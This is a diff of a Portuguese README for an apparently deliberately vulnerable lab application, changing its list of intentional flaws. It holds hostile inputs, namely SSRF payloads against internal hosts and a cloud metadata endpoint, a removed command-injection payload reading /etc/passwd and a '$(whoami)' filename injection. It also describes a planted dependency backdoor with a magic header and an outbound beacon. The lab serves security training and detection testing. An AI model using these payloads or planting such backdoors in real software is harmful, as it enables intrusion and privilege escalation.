@@ -173,27 +173,32 @@ curl "http://localhost:3001/api/chamados/1/pdf?nome=\$(whoami).pdf" \
   -H "Authorization: Bearer $TOKEN"
 ```
 
-### 6. Command Injection + SSRF — `POST /api/admin/health-check`
+### 6. SSRF via bypass de `baseURL` — `GET /api/admin/kb?ref=`
 
-O "verificar status do ambiente" do admin faz `exec('ping -c 1 ' + host)` (RCE
-via injeção de shell) **e** `axios.get(url)` com uma URL fornecida pelo
-usuário (SSRF, agravado pelo CVE-2024-39338 do axios 1.7.3 fixado no projeto).
+A "consulta à base de conhecimento interna" usa
+`axios.create({ baseURL: 'http://kb-interna' })` e repassa o parâmetro `ref`
+direto pro `axios.get(ref)`. Em uso normal, `ref` é um path relativo
+(`/artigos/1.json`) e retorna um artigo da KB interna (container
+`kb-interna`, sem porta publicada — só alcançável a partir do backend). Um
+`ref` **protocol-relative** explora o CVE-2024-39338 do axios 1.7.3 fixado no
+projeto: versões ≤1.7.3 resolvem `//host` como URL absoluta, ignorando o
+`baseURL` e escapando para o host informado pelo atacante.
 
 ```bash
-# Command injection no campo host
-curl -X POST "http://localhost:3001/api/admin/health-check" \
-  -H "Authorization: Bearer $TOKEN_ADMIN" -H "Content-Type: application/json" \
-  -d '{"host": "127.0.0.1; cat /etc/passwd"}'
+# Uso normal: artigo da KB interna
+curl --get "http://localhost:3001/api/admin/kb" \
+  --data-urlencode "ref=/artigos/1.json" \
+  -H "Authorization: Bearer $TOKEN"
 
-# SSRF: sondar rede interna/serviços que não deveriam ser alcançáveis do front
-curl -X POST "http://localhost:3001/api/admin/health-check" \
-  -H "Authorization: Bearer $TOKEN_ADMIN" -H "Content-Type: application/json" \
-  -d '{"url": "http://192.168.1.1:22"}'
+# SSRF: bypass do baseURL — sonda rede interna que não deveria ser alcançável
+curl --get "http://localhost:3001/api/admin/kb" \
+  --data-urlencode "ref=//192.168.1.1:22" \
+  -H "Authorization: Bearer $TOKEN"
 
 # SSRF contra metadata endpoint (se rodando em nuvem)
-curl -X POST "http://localhost:3001/api/admin/health-check" \
-  -H "Authorization: Bearer $TOKEN_ADMIN" -H "Content-Type: application/json" \
-  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
+curl --get "http://localhost:3001/api/admin/kb" \
+  --data-urlencode "ref=//169.254.169.254/latest/meta-data/" \
+  -H "Authorization: Bearer $TOKEN"
 ```
 
 ### 7. Upload sem limites — `POST /api/chamados/:id/anexos` (multer 1.4.4-2.0.1 / CVE-2025-47944)
@@ -230,6 +235,31 @@ for senha in 123456 admin123 senha123 aurora2024; do
 done
 ```
 
+### 9. Dependência maliciosa (slopsquatting) — backdoor de autenticação
+
+O backend usa um pacote local `express-audit-log` (vendorizado em
+`backend/vendor/express-audit-log/`, nome plausível de um "pacote de
+auditoria" que uma IA sugeriria sem revisão) que, além de logar requisições,
+contém um backdoor: ao ver o header `X-Debug` com o valor esperado, ele forja
+um JWT `papel: admin` usando o mesmo segredo fraco do projeto e sobrescreve o
+`Authorization` da requisição **antes** do middleware de autenticação normal
+rodar — qualquer requisição vira admin, mesmo sem token nenhum. O pacote
+também dispara uma tentativa de conexão de saída (beacon) no startup do
+processo.
+
+```bash
+# Sem token nenhum, a rota normalmente nega:
+curl -i "http://localhost:3001/api/usuarios"
+
+# O header mágico do backdoor concede acesso sem nenhuma credencial real:
+curl -i "http://localhost:3001/api/usuarios" -H "X-Debug: trace-9f2c"
+```
+
+Diferente das 4 dependências da tabela abaixo, este pacote **não tem CVE
+público** — o Trivy/SCA não tem base pra correlacionar e não o detecta. Só é
+interceptado em runtime: Wazuh (processo com conexão de saída anômala no
+startup, FIM sobre `node_modules`/`vendor`) e Suricata (tráfego C2 de saída).
+
 ## Dependências vulneráveis conhecidas (detectáveis via Trivy/SCA)
 
 | Pacote | Versão fixada | CVE | CWE |
@@ -241,6 +271,11 @@ done
 
 Essas versões estão **fixadas de propósito** em `backend/package.json` — não
 devem ser atualizadas fora do escopo do exercício.
+
+> O pacote `express-audit-log` (item 9 acima) não aparece nesta tabela de
+> propósito: é uma dependência maliciosa sem CVE público, usada para
+> demonstrar o limite da SCA — o Trivy detecta CVE conhecido, não um
+> backdoor novo sem advisory público.
 
 ## Aviso final
 
